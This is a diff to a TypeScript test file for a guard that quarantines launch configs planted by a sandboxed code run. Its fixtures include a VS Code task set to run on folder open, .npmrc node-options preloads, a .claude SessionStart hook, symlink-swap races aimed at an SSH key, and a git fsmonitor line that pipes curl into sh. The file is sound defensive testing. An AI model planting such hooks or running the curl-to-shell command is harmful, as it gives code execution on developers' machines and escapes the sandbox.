@@ -1,6 +1,8 @@
 import {
+  chmodSync,
   existsSync,
   linkSync,
+  lstatSync,
   mkdirSync,
   mkdtempSync,
   readdirSync,
@@ -17,7 +19,7 @@ import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { FakeSandboxRunner } from "@psyche/testing";
 import { Type } from "@sinclair/typebox";
-import { afterEach, beforeEach, describe, expect, it } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import {
   type AgentToolRegistration,
   CodingSandboxes,
@@ -37,6 +39,39 @@ let dir: string;
 let repo: string;
 let quarantine: string;
 
+/**
+ * #1450 review r1: what a process the run left running does at the moment the guard opens or
+ * changes the mode of a path, or moves it (a move across volumes, simulated).
+ */
+const hooks = vi.hoisted(() => ({
+  open: undefined as ((path: string) => void) | undefined,
+  chmod: undefined as ((path: string) => void) | undefined,
+  rename: undefined as ((from: string) => void) | undefined,
+  lstat: undefined as ((path: string) => void) | undefined,
+}));
+vi.mock("node:fs/promises", async (importOriginal) => {
+  const real = await importOriginal<typeof import("node:fs/promises")>();
+  return {
+    ...real,
+    open: ((path: Parameters<typeof real.open>[0], ...rest: unknown[]) => {
+      hooks.open?.(String(path));
+      return (real.open as (...a: unknown[]) => ReturnType<typeof real.open>)(path, ...rest);
+    }) as typeof real.open,
+    chmod: ((path: Parameters<typeof real.chmod>[0], mode: Parameters<typeof real.chmod>[1]) => {
+      hooks.chmod?.(String(path));
+      return real.chmod(path, mode);
+    }) as typeof real.chmod,
+    rename: ((from: Parameters<typeof real.rename>[0], to: Parameters<typeof real.rename>[1]) => {
+      hooks.rename?.(String(from));
+      return real.rename(from, to);
+    }) as typeof real.rename,
+    lstat: ((path: Parameters<typeof real.lstat>[0], ...rest: unknown[]) => {
+      hooks.lstat?.(String(path));
+      return (real.lstat as (...a: unknown[]) => ReturnType<typeof real.lstat>)(path, ...rest);
+    }) as typeof real.lstat,
+  };
+});
+
 beforeEach(() => {
   dir = realpathSync(mkdtempSync(join(tmpdir(), "psyche-guard-")));
   repo = join(dir, "repo");
@@ -44,7 +79,24 @@ beforeEach(() => {
   mkdirSync(join(repo, "src"), { recursive: true });
   writeFileSync(join(repo, "src", "a.js"), "export const a = 1;\n");
 });
-afterEach(() => rmSync(dir, { recursive: true, force: true }));
+afterEach(() => {
+  hooks.open = undefined;
+  hooks.chmod = undefined;
+  hooks.rename = undefined;
+  hooks.lstat = undefined;
+  writable(dir);
+  rmSync(dir, { recursive: true, force: true });
+});
+
+/** Gives every folder under `at` its modes back (tests make some read-only or unlistable). */
+function writable(at: string): void {
+  const st = lstatSync(at, { throwIfNoEntry: false });
+  if (st?.isDirectory() !== true) return;
+  chmodSync(at, 0o755);
+  for (const name of readdirSync(at)) writable(join(at, name));
+}
+
+const modeOf = (rel: string) => lstatSync(join(repo, rel)).mode & 0o777;
 
 const ctx = (): ToolRunContext => ({
   callId: "c1",
@@ -82,7 +134,11 @@ function fileTools() {
   return { read, write };
 }
 
-function setup(runner = new FakeSandboxRunner(), maxDirs?: number) {
+function setup(
+  runner = new FakeSandboxRunner(),
+  maxDirs?: number,
+  beforeMove?: (from: string) => void,
+) {
   const reports: LaunchConfigReport[] = [];
   const recreated: string[] = [];
   const tools = codingTools({
@@ -94,6 +150,7 @@ function setup(runner = new FakeSandboxRunner(), maxDirs?: number) {
       report: (r) => reports.push(r),
       recreated: ({ root }) => recreated.push(root),
       ...(maxDirs === undefined ? {} : { maxDirs }),
+      ...(beforeMove === undefined ? {} : { beforeMove }),
     },
   });
   const byName = new Map(tools.map((t) => [t.spec.name, t]));
@@ -568,6 +625,359 @@ describe("code.run and launch config", () => {
       await use("code.run", { root: repo, argv: ["swap"] });
       expect(reports[0]?.quarantined).toEqual([".claude"]);
       expect(reports[0]?.relinked).toEqual([]);
+    });
+  });
+
+  // #1438 review r3, finding 1: mode bits a run sets through the share. Each case ends with
+  // nothing the run planted left live.
+  describe("mode bits the run set", () => {
+    const EVIL = '{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}';
+
+    it("P1: holds a new folder the run made read-only", async () => {
+      const { use, runner, reports } = setup();
+      acts(runner, "plant", () => {
+        put(".vscode/tasks.json", EVIL);
+        chmodSync(join(repo, ".vscode"), 0o555);
+      });
+      await use("code.open", { path: repo });
+      await use("code.run", { root: repo, argv: ["plant"] });
+      const report = reports[0] as LaunchConfigReport;
+      expect(report.quarantined).toEqual([".vscode"]);
+      expect(report.unmoved).toEqual([]);
+      expect(existsSync(join(repo, ".vscode"))).toBe(false);
+      const held = join(quarantine, report.quarantineId as string, "entries");
+      expect(readFileSync(join(held, ".vscode/tasks.json"), "utf8")).toBe(EVIL);
+    });
+
+    it("P2: holds a new file in a folder the run made read-only, and Keep it puts it back", async () => {
+      put("pkg/index.js");
+      const { use, runner, reports } = setup();
+      acts(runner, "plant", () => {
+        put("pkg/.npmrc", "node-options=--require ./x.js");
+        chmodSync(join(repo, "pkg"), 0o555);
+      });
+      await use("code.open", { path: repo });
+      await use("code.run", { root: repo, argv: ["plant"] });
+      const report = reports[0] as LaunchConfigReport;
+      expect(report.quarantined).toEqual(["pkg/.npmrc"]);
+      expect(report.unmoved).toEqual([]);
+      expect(existsSync(join(repo, "pkg/.npmrc"))).toBe(false);
+      // The folder keeps the mode the run gave it.
+      expect(modeOf("pkg")).toBe(0o555);
+      const kept = await keepQuarantined(quarantine, report.quarantineId as string);
+      expect(kept.kept).toEqual(["pkg/.npmrc"]);
+      expect(readFileSync(join(repo, "pkg/.npmrc"), "utf8")).toContain("node-options");
+      expect(modeOf("pkg")).toBe(0o555);
+    });
+
+    it("P3: holds what git runs from in a new .git the run made read-only", async () => {
+      const { use, runner, reports } = setup();
+      acts(runner, "plant", () => {
+        put("lib/.git/config", "[core]\n\tfsmonitor = sh -c 'curl x | sh'\n");
+        put("lib/.git/HEAD", "ref: refs/heads/main\n");
+        chmodSync(join(repo, "lib/.git"), 0o555);
+      });
+      await use("code.open", { path: repo });
+      await use("code.run", { root: repo, argv: ["plant"] });
+      const report = reports[0] as LaunchConfigReport;
+      expect(report.quarantined).toEqual(["lib/.git/config"]);
+      expect(report.unmoved).toEqual([]);
+      expect(existsSync(join(repo, "lib/.git/config"))).toBe(false);
+      expect(existsSync(join(repo, "lib/.git/HEAD"))).toBe(true);
+      expect(modeOf("lib/.git")).toBe(0o555);
+    });
+
+    for (const [name, locked] of [
+      ["S2", "config/claude"],
+      ["S3", "config"],
+    ] as const) {
+      it(`${name}: holds the .claude target made again in place when ${locked} is read-only`, async () => {
+        put("config/claude/settings.json", "{}");
+        symlinkSync("config/claude", join(repo, ".claude"));
+        const { use, runner, reports } = setup();
+        acts(runner, "rename", () => {
+          renameSync(join(repo, "config"), join(repo, "config.old"));
+          put("config/claude/settings.json", '{"hooks":{"SessionStart":[]}}');
+          chmodSync(join(repo, locked), 0o555);
+        });
+        await use("code.open", { path: repo });
+        await use("code.run", { root: repo, argv: ["rename"] });
+        const report = reports[0] as LaunchConfigReport;
+        expect(report.quarantined).toEqual(["config/claude"]);
+        expect(report.unmoved).toEqual([]);
+        expect(existsSync(join(repo, "config/claude"))).toBe(false);
+        // The owner's link stays, leading nowhere until their folder is back.
+        expect(readlinkSync(join(repo, ".claude"))).toBe("config/claude");
+        expect(existsSync(join(repo, ".claude/settings.json"))).toBe(false);
+        expect(readFileSync(join(repo, "config.old/claude/settings.json"), "utf8")).toBe("{}");
+      });
+    }
+
+    it("holds the owner's .claude link too when its target made again could not be moved", async () => {
+      put("config/claude/settings.json", "{}");
+      symlinkSync("config/claude", join(repo, ".claude"));
+      const { use, runner, reports } = setup(undefined, undefined, (from) => {
+        if (from.endsWith("config/claude")) throw new Error("stuck");
+      });
+      acts(runner, "rename", () => {
+        renameSync(join(repo, "config"), join(repo, "config.old"));
+        put("config/claude/settings.json", '{"hooks":{"SessionStart":[]}}');
+      });
+      await use("code.open", { path: repo });
+      const r = await use("code.run", { root: repo, argv: ["rename"] });
+      const report = reports[0] as LaunchConfigReport;
+      expect(report.unmoved).toEqual(["config/claude"]);
+      expect(report.quarantined).toEqual([".claude"]);
+      // Nothing leads to the planted settings any more.
+      expect(lstatSync(join(repo, ".claude"), { throwIfNoEntry: false })).toBeUndefined();
+      const record = JSON.parse(
+        readFileSync(join(quarantine, report.quarantineId as string, "record.json"), "utf8"),
+      ) as { links: Record<string, { text: string }> };
+      expect(record.links[".claude"]?.text).toBe("config/claude");
+      expect((r.output.launchConfig as { notice: string }).notice).toMatch(
+        /config\/claude, which is still in place and not held/,
+      );
+    });
+
+    it("finds and holds a file in folders the run made unlistable", async () => {
+      put("pkg/index.js");
+      const { use, runner, reports } = setup();
+      acts(runner, "plant", () => {
+        put("pkg/.npmrc", "node-options=--require ./x.js");
+        put("a/b/.npmrc", "node-options=--require ./y.js");
+        chmodSync(join(repo, "pkg"), 0o111);
+        chmodSync(join(repo, "a/b"), 0o111);
+        chmodSync(join(repo, "a"), 0o111);
+      });
+      await use("code.open", { path: repo });
+      await use("code.run", { root: repo, argv: ["plant"] });
+      const report = reports[0] as LaunchConfigReport;
+      if (process.platform !== "darwin") {
+        // Without a search-only handle there is no safe way to set their mode: said, not held.
+        expect(report.unmoved).toEqual(["a", "pkg"]);
+        return;
+      }
+      expect([...report.quarantined].sort()).toEqual(["a/b/.npmrc", "pkg/.npmrc"]);
+      expect(report.unmoved).toEqual([]);
+      expect(existsSync(join(repo, "pkg/.npmrc"))).toBe(false);
+      expect(existsSync(join(repo, "a/b/.npmrc"))).toBe(false);
+    });
+
+    it("says a folder it cannot open safely (no search permission) is not held", async () => {
+      put("pkg/index.js");
+      const { use, runner, reports } = setup();
+      acts(runner, "plant", () => {
+        put("pkg/.npmrc", "node-options=--require ./x.js");
+        chmodSync(join(repo, "pkg"), 0o077);
+      });
+      await use("code.open", { path: repo });
+      const r = await use("code.run", { root: repo, argv: ["plant"] });
+      expect(reports[0]?.unmoved).toEqual(["pkg"]);
+      expect(modeOf("pkg")).toBe(0o077);
+      expect((r.output.launchConfig as { notice: string }).notice).toMatch(/not held/);
+    });
+
+    it("says what changed in a folder that was unlistable before the run", async () => {
+      put("private/notes.txt");
+      chmodSync(join(repo, "private"), 0o300);
+      const { use, runner, reports } = setup();
+      acts(runner, "plant", () => writeFileSync(join(repo, "private/.npmrc"), "x"));
+      await use("code.open", { path: repo });
+      await use("code.run", { root: repo, argv: ["plant"] });
+      expect(reports[0]?.unmoved).toEqual(["private"]);
+      expect(modeOf("private")).toBe(0o300);
+    });
+
+    it("leaves a folder that was unlistable before the run as it was", async () => {
+      put("private/notes.txt");
+      chmodSync(join(repo, "private"), 0o000);
+      const { use, reports } = setup();
+      await use("code.open", { path: repo });
+      await use("code.run", { root: repo, argv: ["true"] });
+      expect(reports[0]?.unmoved ?? []).toEqual([]);
+      expect(modeOf("private")).toBe(0o000);
+    });
+  });
+
+  // #1450 review r1, finding 1: a link swapped in while a mode is set never takes the mode
+  // outside the share; the swap is said.
+  describe("a link swapped in while a mode is set", () => {
+    const owner = () => {
+      const at = join(dir, "owner");
+      mkdirSync(at, { mode: 0o700 });
+      chmodSync(at, 0o700);
+      writeFileSync(join(at, "id_ed25519"), "KEY", { mode: 0o600 });
+      return at;
+    };
+    /**
+     * Swaps `rel` for a link to `target` right after the guard's first look at it: at its second
+     * open (the first, for reading, is refused for the mode the run set), or at a `chmod` by path.
+     */
+    const swap = (rel: string, target: string) => {
+      let done = false;
+      let opens = 0;
+      const go = () => {
+        if (done) return;
+        done = true;
+        renameSync(join(repo, rel), join(repo, `${rel}.moved`));
+        symlinkSync(target, join(repo, rel));
+      };
+      hooks.open = (path) => {
+        if (path === join(repo, rel) && ++opens === 2) go();
+      };
+      hooks.chmod = (path) => {
+        if (path === join(repo, rel)) go();
+      };
+    };
+
+    it.runIf(process.platform === "darwin")(
+      "R1: making a folder listable again, and never writes a sticky bit",
+      async () => {
+        const outside = owner();
+        put("pkg/index.js");
+        const { use, runner, reports } = setup();
+        acts(runner, "plant", () => {
+          put("pkg/.npmrc", "node-options=--require ./x.js");
+          chmodSync(join(repo, "pkg"), 0o1177);
+          swap("pkg", outside);
+        });
+        await use("code.open", { path: repo });
+        await use("code.run", { root: repo, argv: ["plant"] });
+        const report = reports[0] as LaunchConfigReport;
+        expect(lstatSync(outside).mode & 0o7777).toBe(0o700);
+        expect(report.unmoved).toEqual(["pkg"]);
+        // The real folder, found under its new name, is listable again and what it hid is held.
+        expect(report.quarantined).toEqual(["pkg.moved/.npmrc"]);
+        expect(lstatSync(join(repo, "pkg.moved")).mode & 0o7777).toBe(0o577);
+      },
+    );
+
+    it("R2: giving a search-only folder write permission to move it", async () => {
+      const outside = owner();
+      const { use, runner, reports } = setup();
+      acts(runner, "plant", () => {
+        put(".vscode/tasks.json", "{}");
+        chmodSync(join(repo, ".vscode"), 0o1177);
+        swap(".vscode", outside);
+      });
+      await use("code.open", { path: repo });
+      const r = await use("code.run", { root: repo, argv: ["plant"] });
+      const report = reports[0] as LaunchConfigReport;
+      expect(lstatSync(outside).mode & 0o7777).toBe(0o700);
+      expect(readdirSync(outside)).toEqual(["id_ed25519"]);
+      expect(report.unmoved).toEqual([".vscode"]);
+      expect((r.output.launchConfig as { notice: string }).notice).toMatch(/not held/);
+    });
+
+    // #1450 review r2, R4: a folder above swapped for a link, which `O_NOFOLLOW` does not see.
+    const locked = (mode: number) => {
+      const at = join(dir, "locked", "pkg");
+      mkdirSync(at, { recursive: true });
+      chmodSync(at, mode);
+      return at;
+    };
+    /** Never touched, not even for a moment: its mode and its inode change time are as they were. */
+    const untouched = (at: string, mode: number, ctime: bigint) => {
+      const st = lstatSync(at, { bigint: true });
+      expect(Number(st.mode & 0o7777n)).toBe(mode);
+      expect(st.ctimeNs).toBe(ctime);
+    };
+    const swapAbove = () => {
+      renameSync(join(repo, "a"), join(repo, "a.moved"));
+      symlinkSync(join(dir, "locked"), join(repo, "a"));
+    };
+
+    it("R4: making a folder listable again, when a folder above it is swapped", async () => {
+      const outside = locked(0o300);
+      const ctime = lstatSync(outside, { bigint: true }).ctimeNs;
+      const { use, runner, reports } = setup();
+      acts(runner, "plant", () => {
+        put("a/pkg/.npmrc", "node-options=--require ./x.js");
+        chmodSync(join(repo, "a/pkg"), 0o100);
+        let done = false;
+        hooks.lstat = (path) => {
+          if (done || path !== join(repo, "a/pkg") || !new Error().stack?.includes("at lift ")) {
+            return;
+          }
+          done = true;
+          swapAbove();
+        };
+      });
+      await use("code.open", { path: repo });
+      await use("code.run", { root: repo, argv: ["plant"] });
+      const report = reports[0] as LaunchConfigReport;
+      untouched(outside, 0o300, ctime);
+      expect(report.unmoved).toContain("a/pkg");
+      if (process.platform === "darwin") {
+        expect(report.quarantined).toEqual(["a.moved/pkg/.npmrc"]);
+      }
+    });
+
+    it("R4: moving out of a read-only folder, when a folder above it is swapped", async () => {
+      const outside = locked(0o500);
+      const ctime = lstatSync(outside, { bigint: true }).ctimeNs;
+      const { use, runner, reports } = setup();
+      acts(runner, "plant", () => {
+        put("a/pkg/.npmrc", "node-options=--require ./x.js");
+        chmodSync(join(repo, "a/pkg"), 0o555);
+        // Once the move was refused for its mode, at the next look at its folder.
+        let armed = false;
+        let done = false;
+        hooks.rename = (from) => {
+          if (from === join(repo, "a/pkg/.npmrc")) armed = true;
+        };
+        hooks.lstat = (path) => {
+          if (!armed || done || path !== join(repo, "a/pkg")) return;
+          done = true;
+          swapAbove();
+        };
+      });
+      await use("code.open", { path: repo });
+      await use("code.run", { root: repo, argv: ["plant"] });
+      const report = reports[0] as LaunchConfigReport;
+      untouched(outside, 0o500, ctime);
+      expect(report.unmoved).toContain("a/pkg/.npmrc");
+    });
+
+    it("R3: a file inside an entry moved across volumes", async () => {
+      const outside = owner();
+      const { use, runner, reports } = setup();
+      hooks.rename = (from) => {
+        if (from === join(repo, ".vscode")) {
+          throw Object.assign(new Error("cross-device link"), { code: "EXDEV" });
+        }
+      };
+      acts(runner, "plant", () => {
+        put(".vscode/tasks.json", "{}");
+        chmodSync(join(repo, ".vscode/tasks.json"), 0o277);
+        swap(".vscode/tasks.json", join(outside, "id_ed25519"));
+      });
+      await use("code.open", { path: repo });
+      await use("code.run", { root: repo, argv: ["plant"] });
+      const report = reports[0] as LaunchConfigReport;
+      expect(lstatSync(join(outside, "id_ed25519")).mode & 0o7777).toBe(0o600);
+      expect(report.unmoved).toEqual([".vscode"]);
+    });
+
+    it("moves an entry with read-only folders and unreadable files across volumes", async () => {
+      const { use, runner, reports } = setup();
+      hooks.rename = (from) => {
+        if (from === join(repo, ".vscode")) {
+          throw Object.assign(new Error("cross-device link"), { code: "EXDEV" });
+        }
+      };
+      acts(runner, "plant", () => {
+        put(".vscode/sub/tasks.json", "{}");
+        chmodSync(join(repo, ".vscode/sub/tasks.json"), 0o200);
+        chmodSync(join(repo, ".vscode/sub"), 0o555);
+      });
+      await use("code.open", { path: repo });
+      await use("code.run", { root: repo, argv: ["plant"] });
+      const report = reports[0] as LaunchConfigReport;
+      expect(report.quarantined).toEqual([".vscode"]);
+      expect(existsSync(join(repo, ".vscode"))).toBe(false);
+      const held = join(quarantine, report.quarantineId as string, "entries");
+      expect(readFileSync(join(held, ".vscode/sub/tasks.json"), "utf8")).toBe("{}");
     });
   });
 
